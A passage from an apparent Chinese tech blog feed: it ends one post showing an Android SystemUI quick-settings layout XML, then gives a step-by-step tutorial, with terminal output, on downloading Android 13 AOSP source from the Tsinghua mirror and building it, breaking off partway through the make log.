class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.android.systemui.qs.QSContainerImpl</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/quick_settings_container&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:clipToPadding</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:clipChildren</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 第二种布局 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.android.systemui.qs.NonInterceptingScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/expanded_qs_scroll_view&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:elevation</span>=<span class="string">&quot;@dimen/qs_panel_elevation&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:importantForAccessibility</span>=<span class="string">&quot;no&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:scrollbars</span>=<span class="string">&quot;none&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:clipChildren</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:clipToPadding</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.android.systemui.qs.QSPanel</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/quick_settings_panel&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:background</span>=<span class="string">&quot;@android:color/transparent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:focusable</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:accessibilityTraversalBefore</span>=<span class="string">&quot;@android:id/edit&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:clipToPadding</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:clipChildren</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/qs_footer_impl&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">com.android.systemui.qs.QSPanel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.android.systemui.qs.NonInterceptingScrollView</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 第一种布局 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/quick_status_bar_expanded_header&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span></span></span><br><span class="line"><span class="tag">        <span class="attr">layout</span>=<span class="string">&quot;@layout/footer_actions&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/qs_footer_actions&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;@dimen/footer_actions_height&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;bottom&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 第三种布局 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/qs_customize&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">layout</span>=<span class="string">&quot;@layout/qs_customize_panel&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:visibility</span>=<span class="string">&quot;gone&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.android.systemui.qs.QSContainerImpl</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> SystemUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13源码下载和编译过程详解</title>
      <link href="/2023/05/21/2023-05-21/"/>
      <url>/2023/05/21/2023-05-21/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为Android开发者人人都应该有一份自己Android源码,这样我们就可以随时对自己有疑惑的地方通过亲手调试来加强理解</p><h1 id="一-源码下载"><a href="#一-源码下载" class="headerlink" title="一 源码下载"></a>一 源码下载</h1><h2 id="1-1-配置要求"><a href="#1-1-配置要求" class="headerlink" title="1.1 配置要求"></a>1.1 配置要求</h2><p>官方推荐配置请参考：<a href="https://source.android.google.cn/docs/setup/start/requirements?hl=zh-cn">AOSP使用入门文档</a>，重点有如下几项：</p><h3 id="1-1-1-硬件配置要求"><a href="#1-1-1-硬件配置要求" class="headerlink" title="1.1.1 硬件配置要求"></a>1.1.1 硬件配置要求</h3><ol><li>至少需要 250 GB 可用磁盘空间；如果要进行构建，则还需要 150 GB。如果要进行多次构建，则需要更多空间。</li><li>磁盘至少 250GB，实测建议至少 512G。</li></ol><h3 id="1-1-2-软件要求"><a href="#1-1-2-软件要求" class="headerlink" title="1.1.2 软件要求"></a>1.1.2 软件要求</h3><p>推荐使用 Ubuntu 18.04 (Bionic Beaver)、 Docker、Linux。<br>2021年6月22日起，不再支持 Windows 或 MacOS 上构建。<br>2020年1月1日起，不再支持 python2，请使用 python3。</p><h2 id="1-2-下载环境搭建"><a href="#1-2-下载环境搭建" class="headerlink" title="1.2 下载环境搭建"></a>1.2 下载环境搭建</h2><h3 id="1-2-1-依赖安装"><a href="#1-2-1-依赖安装" class="headerlink" title="1.2.1 依赖安装"></a>1.2.1 依赖安装</h3><p>请使用如下命令安装相关依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev libc6-dev-i386 libncurses5 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig</span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev libc6-dev-i386 libncurses5 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">......</span><br><span class="line">升级了 0 个软件包，新安装了 114 个软件包，要卸载 0 个软件包，有 5 个软件包未被升级。</span><br><span class="line">需要下载 58.6 MB 的归档。</span><br><span class="line">解压缩后会消耗 262 MB 的额外空间。</span><br><span class="line">您希望继续执行吗？ [Y/n] y</span><br><span class="line">......</span><br><span class="line">python3 已经是最新版 (3.6.7-1~18.04)。</span><br><span class="line">python3 已设置为手动安装。</span><br><span class="line">下列软件包是自动安装的并且现在不需要了：</span><br><span class="line">  gir1.2-goa-1.0 gir1.2-snapd-1</span><br><span class="line">使用&#x27;sudo apt autoremove&#x27;来卸载它(它们)。</span><br><span class="line">升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 5 个软件包未被升级。</span><br></pre></td></tr></table></figure><h3 id="1-2-2-git配置"><a href="#1-2-2-git配置" class="headerlink" title="1.2.2 git配置"></a>1.2.2 git配置</h3><p>请使用如下命令对git进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &#x27;xxx&#x27;</span><br><span class="line">git config --global user.email &#x27;xxx@xxx.com&#x27;</span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ git config --global user.name &#x27;longzhiye&#x27; </span><br><span class="line">longzhiye@longzhiye-laptop:~$ git config --global user.email &#x27;longzhiye163@163.com&#x27;</span><br></pre></td></tr></table></figure><h3 id="1-2-3-repo配置"><a href="#1-2-3-repo配置" class="headerlink" title="1.2.3 repo配置"></a>1.2.3 repo配置</h3><p>由于某墙的原因,这里我们采用国内的镜像源进行下载.<br>目前,可用的镜像源一般是科大和清华的,具体使用差不多,这里我选择清华大学镜像进行说明.(参考:<a href="https://link.jianshu.com/?t=https://lug.ustc.edu.cn/wiki/mirrors/help/aosp">科大源</a>,<a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP">清华源</a>)，请使用如下命令更新repo并进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/bin</span><br><span class="line">PATH=~/bin:$PATH</span><br><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo</span><br><span class="line">chmod +x ~/bin/repo</span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ mkdir ~/bin</span><br><span class="line">longzhiye@longzhiye-laptop:~$ PATH=~/bin:$PATH</span><br><span class="line">longzhiye@longzhiye-laptop:~$ curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 45805  100 45805    0     0   117k      0 --:--:-- --:--:-- --:--:--  117k</span><br><span class="line">longzhiye@longzhiye-laptop:~$ chmod +x ~/bin/repo</span><br></pre></td></tr></table></figure><h2 id="1-3-源码下载"><a href="#1-3-源码下载" class="headerlink" title="1.3 源码下载"></a>1.3 源码下载</h2><h3 id="1-3-1-明确下载版本"><a href="#1-3-1-明确下载版本" class="headerlink" title="1.3.1 明确下载版本"></a>1.3.1 明确下载版本</h3><p>请通过浏览器访问：<a href="https://source.android.google.cn/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds">分支列表</a>，来选取需要的版本。<br>        网页显示如下：</p><h3 id="1-3-2-替换为清华源"><a href="#1-3-2-替换为清华源" class="headerlink" title="1.3.2 替换为清华源"></a>1.3.2 替换为清华源</h3><p>请使用如下命令将源替换为清华源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export REPO_URL=&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/&#x27;</span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~$ export REPO_URL=&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/&#x27;</span><br></pre></td></tr></table></figure><h3 id="1-3-3-初始化仓库并指定分支"><a href="#1-3-3-初始化仓库并指定分支" class="headerlink" title="1.3.3 初始化仓库并指定分支"></a>1.3.3 初始化仓库并指定分支</h3><p>请使用如下命令初始化仓库并指定分支，此处以android-13.0.0_r40分支为例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-13.0.0_r40</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project$ mkdir androidt    // 建立下载位置</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project$ cd androidt/</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-13.0.0_r40</span><br><span class="line">Downloading Repo source from https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/</span><br><span class="line">remote: Enumerating objects: 4495, done.</span><br><span class="line">remote: Counting objects: 100% (4495/4495), done.</span><br><span class="line">remote: Compressing objects: 100% (2144/2144), done.</span><br><span class="line">remote: Total 8060 (delta 3993), reused 2351 (delta 2351), pack-reused 3565</span><br><span class="line">接收对象中: 100% (8060/8060), 3.81 MiB | 1016.00 KiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (5177/5177), 完成.</span><br><span class="line">repo: Updating release signing keys to keyset ver 2.3</span><br><span class="line"></span><br><span class="line">Your identity is: longzhiye &lt;longzhiye163@163.com&gt;</span><br><span class="line">If you want to change this, please re-run &#x27;repo init&#x27; with --config-name</span><br><span class="line"></span><br><span class="line">Testing colorized output (for &#x27;repo diff&#x27;, &#x27;repo status&#x27;):</span><br><span class="line">  black    red      green    yellow   blue     magenta   cyan     white </span><br><span class="line">  bold     dim      ul       reverse </span><br><span class="line">Enable color display in this user account (y/N)? y</span><br><span class="line"></span><br><span class="line">repo has been initialized in /home/longzhiye/mount/project/androidt</span><br><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ ls -al</span><br><span class="line">总用量 12</span><br><span class="line">drwxrwxr-x 3 longzhiye longzhiye 4096 5月  20 00:48 .</span><br><span class="line">drwxrwxrwx 3 root      root      4096 5月  20 00:44 ..</span><br><span class="line">drwxrwxr-x 5 longzhiye longzhiye 4096 5月  20 00:48 .repo</span><br></pre></td></tr></table></figure><h3 id="1-3-4-同步全部源码"><a href="#1-3-4-同步全部源码" class="headerlink" title="1.3.4 同步全部源码"></a>1.3.4 同步全部源码</h3><p>初始化仓库之后,就可以开始正式同步代码到本地了,命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo sync -c -j8</span><br></pre></td></tr></table></figure><p>此处为了加快速度使用了-c参数，表示只同步当前分支，-j8表示使用8个线程今天同步代码，使用多少个线程请根据自己的机器配置自行修改。<br>(提示:一定要确定代码完全同步了,不然在下面编译过程出现的错误会让你痛不欲生,不确定的童鞋可以多用repo sync同步几次)</p><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ repo sync -c -j8</span><br><span class="line">Fetching: 100% (1135/1135), done in 4h51m48.506s</span><br><span class="line">正在检出文件: 100% (1972/1972), 完成.</span><br><span class="line">正在检出文件: 100% (1787/1787), 完成.</span><br><span class="line">......</span><br><span class="line">正在检出文件: 100% (724/724), 完成.orm/system/keymaster正在检出文件:  73% (534/724)   </span><br><span class="line">Checking out: 100% (1135/1135), done in 44m21.860s</span><br><span class="line">repo sync has finished successfully.</span><br></pre></td></tr></table></figure><p>源码同步时间比较长，此时Android13源码已经同步完成。</p><h1 id="二-Android源码编译"><a href="#二-Android源码编译" class="headerlink" title="二 Android源码编译"></a>二 Android源码编译</h1><h2 id="2-1-编译环境搭建"><a href="#2-1-编译环境搭建" class="headerlink" title="2.1 编译环境搭建"></a>2.1 编译环境搭建</h2><p>使用如下命令安装JDK：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-11-jdk</span><br></pre></td></tr></table></figure><p>安装完成后可以使用如下命令查看是否按照成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:javac -version</span><br><span class="line">javac 11.0.17</span><br></pre></td></tr></table></figure><h2 id="2-2-全编译"><a href="#2-2-全编译" class="headerlink" title="2.2 全编译"></a>2.2 全编译</h2><h3 id="2-2-1-初始化编译环境"><a href="#2-2-1-初始化编译环境" class="headerlink" title="2.2.1 初始化编译环境"></a>2.2.1 初始化编译环境</h3><p>执行如下命令进行编译环境初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source build/envsetup.sh</span><br><span class="line">或者：</span><br><span class="line">. build/envsetup.sh</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ source build/envsetup.sh</span><br></pre></td></tr></table></figure><h3 id="2-2-2-选择构建目标"><a href="#2-2-2-选择构建目标" class="headerlink" title="2.2.2 选择构建目标"></a>2.2.2 选择构建目标</h3><p>执行lunch命令执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ lunch</span><br><span class="line"></span><br><span class="line">You&#x27;re building on Linux</span><br><span class="line"></span><br><span class="line">Lunch menu .. Here are the common combinations:</span><br><span class="line">     1. aosp_arm-eng</span><br><span class="line">     2. aosp_arm64-eng</span><br><span class="line">     3. aosp_barbet-userdebug</span><br><span class="line">     4. aosp_bluejay-userdebug</span><br><span class="line">     5. aosp_bluejay_car-userdebug</span><br><span class="line">     6. aosp_bramble-userdebug</span><br><span class="line">     7. aosp_bramble_car-userdebug</span><br><span class="line">     8. aosp_car_arm-userdebug</span><br><span class="line">     9. aosp_car_arm64-userdebug</span><br><span class="line">     10. aosp_car_x86-userdebug</span><br><span class="line">     11. aosp_car_x86_64-userdebug</span><br><span class="line">     12. aosp_cf_arm64_auto-userdebug</span><br><span class="line">     13. aosp_cf_arm64_phone-userdebug</span><br><span class="line">     14. aosp_cf_x86_64_foldable-userdebug</span><br><span class="line">     15. aosp_cf_x86_64_pc-userdebug</span><br><span class="line">     16. aosp_cf_x86_64_phone-userdebug</span><br><span class="line">     17. aosp_cf_x86_64_tv-userdebug</span><br><span class="line">     18. aosp_cf_x86_auto-userdebug</span><br><span class="line">     19. aosp_cf_x86_phone-userdebug</span><br><span class="line">     20. aosp_cf_x86_tv-userdebug</span><br><span class="line">     21. aosp_cheetah-userdebug</span><br><span class="line">     22. aosp_cloudripper-userdebug</span><br><span class="line">     23. aosp_coral-userdebug</span><br><span class="line">     24. aosp_coral_car-userdebug</span><br><span class="line">     25. aosp_flame-userdebug</span><br><span class="line">     26. aosp_flame_car-userdebug</span><br><span class="line">     27. aosp_oriole-userdebug</span><br><span class="line">     28. aosp_oriole_car-userdebug</span><br><span class="line">     29. aosp_panther-userdebug</span><br><span class="line">     30. aosp_raven-userdebug</span><br><span class="line">     31. aosp_raven_car-userdebug</span><br><span class="line">     32. aosp_ravenclaw-userdebug</span><br><span class="line">     33. aosp_redfin-userdebug</span><br><span class="line">     34. aosp_redfin_car-userdebug</span><br><span class="line">     35. aosp_redfin_vf-userdebug</span><br><span class="line">     36. aosp_slider-userdebug</span><br><span class="line">     37. aosp_sunfish-userdebug</span><br><span class="line">     38. aosp_sunfish_car-userdebug</span><br><span class="line">     39. aosp_trout_arm64-userdebug</span><br><span class="line">     40. aosp_trout_x86-userdebug</span><br><span class="line">     41. aosp_whitefin-userdebug</span><br><span class="line">     42. aosp_x86-eng</span><br><span class="line">     43. aosp_x86_64-eng</span><br><span class="line">     44. arm_krait-eng</span><br><span class="line">     45. arm_v7_v8-eng</span><br><span class="line">     46. armv8-eng</span><br><span class="line">     47. armv8_cortex_a55-eng</span><br><span class="line">     48. armv8_kryo385-eng</span><br><span class="line">     49. beagle_x15-userdebug</span><br><span class="line">     50. beagle_x15_auto-userdebug</span><br><span class="line">     51. car_ui_portrait-userdebug</span><br><span class="line">     52. car_x86_64-userdebug</span><br><span class="line">     53. db845c-userdebug</span><br><span class="line">     54. gsi_car_arm64-userdebug</span><br><span class="line">     55. gsi_car_x86_64-userdebug</span><br><span class="line">     56. hikey-userdebug</span><br><span class="line">     57. hikey64_only-userdebug</span><br><span class="line">     58. hikey960-userdebug</span><br><span class="line">     59. hikey960_tv-userdebug</span><br><span class="line">     60. hikey_tv-userdebug</span><br><span class="line">     61. poplar-eng</span><br><span class="line">     62. poplar-user</span><br><span class="line">     63. poplar-userdebug</span><br><span class="line">     64. qemu_trusty_arm64-userdebug</span><br><span class="line">     65. rb5-userdebug</span><br><span class="line">     66. sdk_car_arm-userdebug</span><br><span class="line">     67. sdk_car_arm64-userdebug</span><br><span class="line">     68. sdk_car_portrait_x86_64-userdebug</span><br><span class="line">     69. sdk_car_x86-userdebug</span><br><span class="line">     70. sdk_car_x86_64-userdebug</span><br><span class="line">     71. sdk_pc_x86_64-userdebug</span><br><span class="line">     72. silvermont-eng</span><br><span class="line">     73. uml-userdebug</span><br><span class="line">     74. yukawa-userdebug</span><br><span class="line">     75. yukawa_sei510-userdebug</span><br><span class="line"></span><br><span class="line">Which would you like? [aosp_arm-eng]</span><br><span class="line">Pick from common choices above (e.g. 13) or specify your own (e.g. aosp_barbet-eng): aosp_arm64-eng</span><br><span class="line"></span><br><span class="line">Hint: next time you can simply run &#x27;lunch aosp_arm64-eng&#x27;</span><br><span class="line"></span><br><span class="line">============================================</span><br><span class="line">PLATFORM_VERSION_CODENAME=REL</span><br><span class="line">PLATFORM_VERSION=13</span><br><span class="line">TARGET_PRODUCT=aosp_arm64</span><br><span class="line">TARGET_BUILD_VARIANT=eng</span><br><span class="line">TARGET_BUILD_TYPE=release</span><br><span class="line">TARGET_ARCH=arm64</span><br><span class="line">TARGET_ARCH_VARIANT=armv8-a</span><br><span class="line">TARGET_CPU_VARIANT=generic</span><br><span class="line">TARGET_2ND_ARCH=arm</span><br><span class="line">TARGET_2ND_ARCH_VARIANT=armv8-a</span><br><span class="line">TARGET_2ND_CPU_VARIANT=generic</span><br><span class="line">HOST_ARCH=x86_64</span><br><span class="line">HOST_2ND_ARCH=x86</span><br><span class="line">HOST_OS=linux</span><br><span class="line">HOST_OS_EXTRA=Linux-5.4.0-148-generic-x86_64-Ubuntu-18.04.6-LTS</span><br><span class="line">HOST_CROSS_OS=windows</span><br><span class="line">HOST_CROSS_ARCH=x86</span><br><span class="line">HOST_CROSS_2ND_ARCH=x86_64</span><br><span class="line">HOST_BUILD_TYPE=release</span><br><span class="line">BUILD_ID=TQ2A.230405.003.B2</span><br><span class="line">OUT_DIR=out</span><br><span class="line">PRODUCT_SOONG_NAMESPACES=device/generic/goldfish device/generic/goldfish-opengl hardware/google/camera hardware/google/camera/devices/EmulatedCamera</span><br><span class="line">============================================</span><br></pre></td></tr></table></figure><p>中间会有选择需要构建的目标，此处以aosp_arm64-eng为例</p><h3 id="2-2-3-编译固件"><a href="#2-2-3-编译固件" class="headerlink" title="2.2.3 编译固件"></a>2.2.3 编译固件</h3><p>通过make指令进行代码编译,该指令通过-j参数来设置参与编译的线程数量,以提高编译速度.比如这里我们设置8个线程同时编译。需要注意的是,参与编译的线程并不是越多越好,通常是根据你机器cup的核心来确定:core*2,即当前cpu的核心的2倍.比如,我现在的笔记本是双核四线程的,因此根据公式,最快速的编译可以make -j8.<br>(通过<strong>cat /proc/cpuinfo</strong>查看相关cpu信息)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j8</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@longzhiye-laptop:~/mount/project/androidt$ make -j8</span><br><span class="line">07:04:26 ************************************************************</span><br><span class="line">07:04:26 You are building on a machine with 15.5GB of RAM</span><br><span class="line">07:04:26 </span><br><span class="line">07:04:26 The minimum required amount of free memory is around 16GB,</span><br><span class="line">07:04:26 and even with that, some configurations may not work.</span><br><span class="line">07:04:26 </span><br><span class="line">07:04:26 If you run 